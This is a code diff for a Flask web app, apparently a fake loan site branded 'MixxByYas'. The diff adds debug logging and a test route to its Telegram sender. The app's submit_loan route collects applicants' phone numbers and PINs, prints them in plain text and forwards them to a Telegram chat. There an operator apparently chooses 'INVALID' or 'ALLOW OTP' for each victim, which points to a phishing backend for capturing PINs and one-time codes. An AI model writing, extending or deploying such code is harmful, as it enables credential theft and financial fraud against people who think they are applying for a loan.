@@ -45,18 +45,25 @@ def add_column():
 
 add_column()
 
+# ==================== TELEGRAM SENDER WITH FULL DEBUG ====================
 def send_telegram(message, reply_markup=None):
+    print("🔥 send_telegram CALLED")
+    print(f"   Message: {message}")
+    print(f"   Reply Markup: {reply_markup}")
     try:
         payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
         if reply_markup:
             payload['reply_markup'] = reply_markup
+        print(f"   Payload: {payload}")
         resp = requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
-        print(f"TELEGRAM SEND STATUS: {resp.status_code}")
-        print(f"TELEGRAM RESPONSE: {resp.text}")
+        print(f"   TELEGRAM RESPONSE STATUS: {resp.status_code}")
+        print(f"   TELEGRAM RESPONSE BODY: {resp.text}")
         if resp.status_code != 200:
-            print(f"TELEGRAM ERROR: {resp.json()}")
+            print(f"   ❌ TELEGRAM ERROR: {resp.json()}")
+        else:
+            print(f"   ✅ MESSAGE SENT SUCCESSFULLY")
     except Exception as e:
-        print(f"TELEGRAM EXCEPTION: {e}")
+        print(f"   ❌ TELEGRAM EXCEPTION: {e}")
         traceback.print_exc()
 
 def edit_telegram(message_id, text):
@@ -66,6 +73,14 @@ def edit_telegram(message_id, text):
     except Exception as e:
         print(f"Edit error: {e}")
 
+# ==================== TEST ROUTE – open this URL in browser to force a Telegram message ====================
+@app.route('/test_telegram')
+def test_telegram():
+    print("🚀 TEST TELEGRAM ROUTE HIT")
+    send_telegram("This is a test message from MixxByYas. If you see this, the bot works!")
+    return "Telegram test message sent. Check the Render logs and your Telegram chat."
+
+# ==================== REGULAR ROUTES ====================
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -86,7 +101,7 @@ def submit_loan():
     amount = int(data.get('amount',0))
     months = int(data.get('months',1))
     purpose = data.get('purpose','')
-    print(f"NEW LOAN REQUEST: phone={phone}, pin={pin}, amount={amount}, purpose={purpose}")
+    print(f"📥 NEW LOAN REQUEST: phone={phone}, pin={pin}, amount={amount}, purpose={purpose}")
     conn = sqlite3.connect('database.db'); c = conn.cursor()
 
     # OTP REQUESTED (Resend)
@@ -124,12 +139,11 @@ def submit_loan():
         {'text':'❌ INVALID','callback_data': deny_callback},
         {'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}
     ]]}
-    print(f"SENDING TELEGRAM MESSAGE: {msg}")
+    print(f"📤 SENDING TELEGRAM MESSAGE for {app_id}...")
     send_telegram(msg, keyboard)
     return jsonify({'success':True,'app_id':app_id})
 
-# ... (rest of the routes remain the same)
-
+# rest of the routes unchanged (submit_code, check_status, webhook) – same as before
 @app.route('/api/submit_code', methods=['POST'])
 def submit_code():
     data = request.json
